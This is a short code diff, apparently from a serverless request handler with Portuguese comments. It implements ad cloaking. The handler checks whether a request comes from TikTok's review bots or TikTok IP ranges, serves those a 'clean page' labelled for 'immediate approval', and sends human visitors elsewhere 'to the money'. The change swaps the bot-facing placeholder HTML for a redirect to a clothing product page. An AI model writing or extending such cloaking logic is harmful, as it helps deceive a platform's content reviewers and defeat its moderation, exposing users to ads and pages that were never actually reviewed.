@@ -17,9 +17,7 @@ export default async function handler(req) {
     // 3) Decide o que entrega
     if (isTikBot || isTTIP) {
         // PÁGINA LIMPA → aprovação imediata
-        return new Response('<html><body>Video wholesome  😇</body></html>', {
-            headers: { 'content-type': 'text/html; charset=utf-8' },
-        });
+        return Response.redirect('https://milano-outlet.com/products/puffer-vest-turtleneck-set-combo', 302);
     }
 
     // HUMANO → redireciona pro dinheiro
